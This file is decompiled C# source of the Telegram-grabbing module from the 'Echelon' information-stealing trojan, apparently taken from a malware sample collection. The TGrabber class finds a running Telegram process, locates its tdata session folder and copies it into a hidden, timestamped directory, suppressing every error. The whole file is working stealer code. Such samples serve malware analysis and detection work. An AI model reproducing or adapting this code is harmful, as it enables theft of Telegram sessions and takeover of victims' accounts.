// Decompiled with JetBrains decompiler
// Type: Echelon.TGrabber
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.Diagnostics;
using System.IO;

namespace Echelon
{
  public class TGrabber
  {
    public static int count;
    private static bool in_patch;

    public static void Start(string Echelon_Dir)
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName("Telegram");
        if (processesByName.Length < 1)
          return;
        string str = Path.GetDirectoryName(processesByName[0].MainModule.FileName) + "\\tdata";
        if (!Directory.Exists(str))
          return;
        string toDir = Echelon_Dir + "\\Telegram_" + ((int) (DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds).ToString();
        TGrabber.CopyAll(str, toDir);
        ++TGrabber.count;
      }
      catch
      {
      }
    }

    private static void CopyAll(string fromDir, string toDir)
    {
      try
      {
        Directory.CreateDirectory(toDir).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
        foreach (string file in Directory.GetFiles(fromDir))
          TGrabber.CopyFile(file, toDir);
        foreach (string directory in Directory.GetDirectories(fromDir))
          TGrabber.CopyDir(directory, toDir);
      }
      catch
      {
      }
    }

    private static void CopyFile(string s1, string toDir)
    {
      try
      {
        string fileName = Path.GetFileName(s1);
        if (TGrabber.in_patch && fileName[0] != 'm' && fileName[1] != 'a' && fileName[2] != 'p')
          return;
        string destFileName = toDir + "\\" + fileName;
        File.Copy(s1, destFileName);
      }
      catch
      {
      }
    }

    private static void CopyDir(string s, string toDir)
    {
      try
      {
        TGrabber.in_patch = true;
        TGrabber.CopyAll(s, toDir + "\\" + Path.GetFileName(s));
        TGrabber.in_patch = false;
      }
      catch
      {
      }
    }
  }
}
